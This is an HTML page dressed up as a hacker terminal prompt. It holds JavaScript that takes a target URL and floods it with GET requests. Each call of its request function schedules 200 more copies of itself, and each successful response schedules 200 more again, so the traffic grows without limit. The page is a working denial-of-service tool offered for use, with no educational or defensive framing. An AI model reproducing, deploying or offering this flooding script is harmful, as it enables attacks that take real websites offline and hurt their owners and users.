<body style="background:black;">
	<center>
	<b style="color:red;">

    <label><a style="color:green;">root</a><a style="color: red;">@</a><a style="color:green;">localhost</a><a style="color: red;">/</a><a style="color:green;">ITX</a><a style="color: red;">/</a><a style="color:green;">address</a><a style="color: red;">$:</a><input type="text" style="width:140px; background:none; outline:none; border:none; color:gray;" id="url-input" size="20"></label>
    <b style="color:#7C7C7C;" id="output"></b>
    <script>
        var inputElement = document.getElementById("url-input");
        var outputElement = document.getElementById("output");
        
           inputElement.addEventListener("keydown", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                sendRequest(inputElement.value);
            }
        });

        function sendRequest(url) {
		for (var i = 0; i < 200; i++) {
            setTimeout(sendRequest, i * 5000, url);
	    }
            if (url.trim() === "") {
                outputElement.innerHTML += "<p>error</p>";
                return;
            }

            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                    	for (var i = 0; i < 200; i++) {
                setTimeout(sendRequest, i * 800, url);
                }
                        outputElement.innerHTML += "<p>request was sent</p>";
                    } else {
                        outputElement.innerHTML += "<p>Problem sending request</p>";
                    }
                }
            };
            xhr.send();
}
    </script>
</body>
